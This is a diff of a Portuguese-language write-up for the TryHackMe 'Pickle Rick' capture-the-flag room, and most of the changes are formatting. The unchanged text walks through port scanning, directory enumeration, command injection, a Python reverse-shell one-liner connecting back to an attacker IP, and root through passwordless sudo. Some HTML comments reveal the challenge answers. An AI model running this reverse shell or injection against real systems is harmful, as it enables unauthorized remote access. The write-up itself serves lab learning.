@@ -1,5 +1,5 @@
 ---
-title: TryHackMe - Pickle Rick
+title: "TryHackMe: Pickle Rick"
 description: Rick e Morty CTF. Ajude a transformar Rick de volta em um humano!
 author: c3n0r4
 categories: [Challenges, Linux]
@@ -11,13 +11,14 @@ image:
 comments: true
 ---
 
+## Descrição do Desafio
 Este desafio com tema de **Rick and Morty** nos leva a explorar um servidor web em busca de **três ingredientes secretos** para ajudar Rick a preparar uma poção que o transforme novamente em humano, após ter virado um picles.
 
 ## Reconhecimento Inicial
 ### Varredura de Portas e Detecção de Serviços com Nmap
 Comecei identificando os serviços ativos na máquina alvo usando o `nmap`com uma varredura completa de portas e detecção de serviços.
 
-```sh
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/picklerick]
 └─$ nmap -p- -sC -sV -n -Pn -T4 10.10.189.231                 
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 18:24 -03
@@ -56,8 +57,8 @@ Inspecionando o código-fonte, encontrei um comentário HTML que revela um nome 
 ```
 
 ### Descoberta de Arquivos e Diretórios com GoBuster
-Utilizamos o ´gobuster´ para descobrir arquivos e diretórios ocultos:
-```sh
+Utilizei o ´gobuster´ para descobrir arquivos e diretórios ocultos:
+```console
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/picklerick]
 └─$ gobuster dir -u http://10.10.189.231 -e -w /usr/share/wordlists/quickhits.txt -t 100 -q
 http://10.10.189.231/.ht_wsr.txt          (Status: 403) [Size: 278]
@@ -123,20 +124,20 @@ THM{*** ******* ****}
 O campo de entrada aceita comandos do sistema, permitindo execução remota (RCE). Utilizamos esse vetor para obter uma **reverse shell**:
 
 
-``` bash
+``` console
 # kali (listener)
 ┌──(c3n0r4㉿kali)-[~/tryhackme/room/picklerick]
 └─$ nc -lvnp 53 
 listening on [any] 53 ...
 ```
 
-```bash
+```console
 # Target (payload)
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.6.47.63",53));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
 ```
 
 Consegui uma shell reversa como `www-data`.
-```sh
+```console
 connect to [10.6.47.63] from (UNKNOWN) [10.10.189.231] 52324
 $ whoami
 whoami
@@ -146,7 +147,7 @@ www-data
 ## Pós-Exploração
 ### Movimentação lateral
 Acessei a home do usuário `rick` e encontrei o **segundo ingrediente:** <!-- 1 jerry tear -->
-``` sh
+``` console
 $ pwd
 pwd
 /var/www/html
@@ -173,7 +174,7 @@ THM{* ***** ****}
 ```
 
 Durante a enumeração local no diretório `/home/ubuntu`, identifiquei o arquivo `.sudo_as_admin_successful`. Sua presença indica que o usuário `ubuntu` já executou comandos com sudo com êxito, o que pode representar uma potencial brecha para **escalada de privilégio**.
-``` sh
+``` console
 $ ls -larth /home/ubuntu
 ls -larth /home/ubuntu
 total 44K
@@ -190,7 +191,7 @@ drwx------ 3 ubuntu ubuntu 4.0K Jul 11  2024 .cache
 -rw------- 1 ubuntu ubuntu  769 Jul 11  2024 .bash_history
 ```
 Com base nessa descoberta, decidi verificar quais comandos o usuário atual `www-data` poderia executar com privilégios elevados, na tentativa de escalar para o usuário `ubuntu`.
-``` sh
+``` console
 $ sudo -l
 sudo -l
 Matching Defaults entries for www-data on ip-10-10-189-231:
@@ -202,15 +203,15 @@ User www-data may run the following commands on ip-10-10-189-231:
 ```
 
 Para minha surpresa, `www-data`, mesmo sendo um usuário limitado do servidor web, tinha permissão para usar `sudo` sem senha. Ou seja, já era possível obter acesso root direto. Ainda assim, usei `sudo bash -i` para finalizar o desafio como root.
-```sh
+```console
 $ sudo bash -i
 sudo bash -i
 root@ip-10-10-189-231:/home/rick#
 ```
 
 ### Escalada de Privilégios
-Já como root, acessei o diretório `/root`, encontrei o **terceiro ingrediente:** <!-- fleeb juice -->
-```bash
+Já como `root`, acessei o diretório `/root`, e encontrei o **terceiro ingrediente:** <!-- fleeb juice -->
+```console
 root@ip-10-10-189-231:/home/rick# cd /root
 cd /root
 root@ip-10-10-189-231:~# ls -larth
